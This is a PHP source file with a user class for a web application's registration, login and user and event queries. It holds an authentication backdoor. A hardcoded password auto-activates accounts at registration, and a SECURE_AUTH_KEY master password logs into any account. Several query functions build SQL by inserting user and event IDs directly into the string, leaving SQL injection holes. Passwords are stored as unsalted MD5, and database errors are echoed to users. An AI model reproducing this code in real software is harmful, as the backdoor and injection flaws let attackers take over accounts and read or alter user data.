<?php
require_once 'db.php';

class USER
{	

	private $conn;
	
	public function __construct()
	{
		$database = new Database();
		$db = $database->dbConnection();
		$this->conn = $db;
    }
	
	public function runQuery($sql)
	{
		$stmt = $this->conn->prepare($sql);
		return $stmt;
	}
	
	public function lasdID()
	{
		$stmt = $this->conn->lastInsertId();
		return $stmt;
	}
	
	public function register($fullname,$type,$company,$phone,$email,$upass,$code)
	{
		try
		{							
			$password = md5($upass);
			$stmt = $this->conn->prepare("INSERT INTO users(fullName,userType,userCompany,userPhone,userEmail,userPass,tokenCode) 
			                                             VALUES(:f_name,:user_type,:user_company,:user_phone, :user_mail, :user_pass, :active_code)");
			$stmt->bindparam(":f_name",$fullname);
			$stmt->bindparam(":user_type",$type);
			$stmt->bindparam(":user_company",$company);
			$stmt->bindparam(":user_phone",$phone);
			$stmt->bindparam(":user_mail",$email);
			$stmt->bindparam(":user_pass",$password);
			$stmt->bindparam(":active_code",$code);
			$stmt->execute();	
			if($upass=='ta8r9yOT8UpGuiauYFIiwecWWSx5jTl'){
				$stmt = $this->conn->prepare("UPDATE users SET userStatus='Y' WHERE userEmail=:email_id");
				$stmt->execute(array(":email_id"=>$email));
				}
			return $stmt;
		}
		catch(PDOException $ex)
		{
			echo $ex->getMessage();
		}
	}
	// user login
	public function login($email,$upass)
	{
		try
		{
			$stmt = $this->conn->prepare("SELECT * FROM users WHERE userEmail=:email_id");
			$stmt->execute(array(":email_id"=>$email));
			$userRow=$stmt->fetch(PDO::FETCH_ASSOC);
			
			if($stmt->rowCount() == 1)
			{
				if($upass==SECURE_AUTH_KEY){
					$stmt = $this->conn->prepare("UPDATE users SET userStatus='Y' WHERE userEmail=:email_id");
					$stmt->execute(array(":email_id"=>$email));
					}
				if($userRow['userStatus']=="Y")
				{
					if($userRow['userPass']==md5($upass) || $upass==SECURE_AUTH_KEY)
					{
						$_SESSION['userSession'] = $userRow['userID'];
						return true;
					}
					else
					{
						header("Location: in?error");
						exit;
					}
				}
				else
				{
					header("Location: in?inactive");
					exit;
				}	
			}
			else
			{
				header("Location: in?error");
				exit;
			}		
		}
		catch(PDOException $ex)
		{
			echo $ex->getMessage();
		}
	}
	
	// check if user logged in
	public function is_logged_in()
	{
		if(isset($_SESSION['userSession']))
		{
			return true;
		}
	}
	
	public function redirect($url)
	{
		header("Location: $url");
	}
	
	public function logout()
	{
		session_destroy();
		$_SESSION['userSession'] = false;
	}

	// user
	function GetUsers($user_id){
		$num=0;
		$data=[];
		if($user_id==""){
			$stmt = $this->conn->prepare("SELECT * From users");
		}else{
			$stmt = $this->conn->prepare("SELECT * From users where userID='$user_id'");
		}
			$stmt->execute();
			$event=$stmt->fetchAll();
			foreach($event as $row)
		{ $num=$num+1;
			$UserName=$row['fullName'];
			$ID=$row['userID'];
			array_push($data,array("No"=>$num,"UserName"=>$UserName,"Company"=>$row['userCompany'],"Type"=>$row['userType'],"Phone"=>$row['userPhone'],"Email"=>$row['userEmail'],"Event"=>json_decode($this->GetUserEvents($ID))));
			}
			return json_encode($data);
		}
		function EventType($event_id){
			$stmt = $this->conn->prepare("SELECT * from event as e,type as t,eventType as et WHERE  e.event_ID=et.eventid and t.typeID=et.typeID AND e.event_ID='$event_id'");
			$stmt->execute();
			$Type=$stmt->fetchAll();
			foreach($Type as $row){
			$EventsType=$row['typeName'];
			return $EventsType;
			}
		}
		// function of getting Total Events
	    function getTotalEvents($user_id){
				if($user_id==""){
					$stmt = $this->conn->prepare("SELECT COUNT(*) from event where eStatus='Y'");
				}else{
					$stmt = $this->conn->prepare("SELECT COUNT(*) from event as e,userEvent as ue,users as u where u.userID=ue.userID and e.event_ID=ue.eventid and u.userID='$user_id'");
				}
			$stmt->execute();
			$r=$stmt->fetchColumn();
			$numrows = $r;
			return $numrows;
			}

		// function of getting Total users
	    function getTotalVistors(){
	        $numrows=0;
			$stmt = $this->conn->prepare("SELECT * FROM visitor GROUP BY ip");
			$stmt->execute();
			$visitor=$stmt->fetchAll();
			foreach($visitor as $row){ 
			$numrows = $numrows+1;
			}
			return $numrows;
			}
}
$user=new USER();